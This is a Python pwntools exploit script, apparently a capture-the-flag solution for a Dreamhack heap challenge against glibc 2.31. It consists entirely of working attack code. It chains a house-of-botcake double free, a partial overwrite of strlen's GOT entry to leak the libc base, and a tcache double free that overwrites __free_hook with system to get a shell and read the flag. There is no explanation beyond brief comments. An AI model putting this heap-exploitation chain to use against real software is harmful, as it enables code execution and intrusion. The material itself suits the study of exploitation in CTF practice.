#!/usr/bin/env python3

from pwn import *

exe = ELF('./prob_patched')
libc = ELF('./libc-2.31.so')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
recvut = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def add(index, leng, data):
	sla(b"choice: ", b"0")
	sla(b"index: ", f"{index}".encode())
	sla(b"length: ", f"{leng}".encode())
	sla(b"information: ", data)

def dele(index):
	sla(b"choice: ", b"1")
	sla(b"index: ", f"{index}".encode())

script = '''
brva 0x1557
brva 0x1258
'''

cnt = 0
while(True):
	try:
		cnt += 1
		lleak("attempt", cnt)

		#p = remote("host3.dreamhack.games", 8328)
		p = remote("0", 8080)
		#p = process('./prob_patched')
		#p = gdb.debug('./prob_patched', gdbscript = script)

		# house of botcake
		for i in range(9):
			add(i, 0x100, f"{i}".encode() * 8)
		add(9, 0x18, b"9" * 8)

		for i in range(7):
			dele(i)
		dele(8)
		dele(7)
		add(6, 0x100, b"A" * 8)
		dele(8) # dbf

		# stdout 0.5 (not really)
		add(0, 0xe8, b"B" * 8)
		add(1, 0x18, b"C" * 8)
		add(2, 0x18, p8(0xa8)) # aim for strlen libc got

		add(3, 0x100, b"D" * 8)
		add(4, 0x100, p8(0x63)) # modify strlen to desired gadget
		'''
		pwndbg> x/10i 0x00007fccdd440063
   		0x7fccdd440063:      sub    eax,ecx
   		0x7fccdd440065:      ret
		'''

		sla("choice: ", b"9999") # somehow it did not print out menu after first time we overwrite strlen -> so have to trigger unknown command to make it print out
		recvut(b"0 - make note")

		while(True):
			libc_base = u64((p.recvuntil(b"\x7f")[-6::]).ljust(8, b"\x00")) - 0x9d850
			if(libc_base & 0xfff == 0):
				lleak("libc base", libc_base)
				break
		
		add(9, 0xe8, b"?" * 8) # take all the left over in unsortedbin to make heap layout easier to exploit

		# abuse dbf, target __free_hook
		for i in range(9):
			add(i, 0x18, f"{i}".encode() * 0x10)
		for i in range(7):
			dele(i)
		dele(8)
		dele(7)
		dele(8) # dbf

		for i in range(7):
			add(i, 0x18, b"/bin/sh\x00")
		__free_hook = libc_base + libc.symbols['__free_hook']
		system = libc_base + libc.symbols['system']
		add(7, 0x18, p64(__free_hook))
		for i in range(2): # padding
			add(7, 0x18, b"A")
		add(7, 0x18, p64(system)) # overwrite free hook
		dele(1)

		sl(b"echo vanishing")
		recvut(b"vanishing")
		break
	except:
		try:
			p.close()
		except:
			pass

sl(b"cat flag")
sl(b"cat flag.txt")

p.interactive()
